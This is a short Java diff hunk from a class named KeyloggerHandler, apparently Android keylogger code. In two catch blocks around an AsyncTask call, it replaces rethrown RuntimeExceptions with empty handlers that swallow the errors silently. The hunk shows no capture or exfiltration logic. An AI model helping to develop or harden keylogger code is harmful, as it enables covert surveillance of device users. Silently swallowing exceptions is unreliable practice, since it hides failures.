@@ -118,9 +118,9 @@ public class KeyloggerHandler {
                 }
             }.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR).get();
         } catch (ExecutionException e) {
-            throw new RuntimeException(e);
+
         } catch (InterruptedException e) {
-            throw new RuntimeException(e);
+
         } finally {
             lock.unlock();
         }
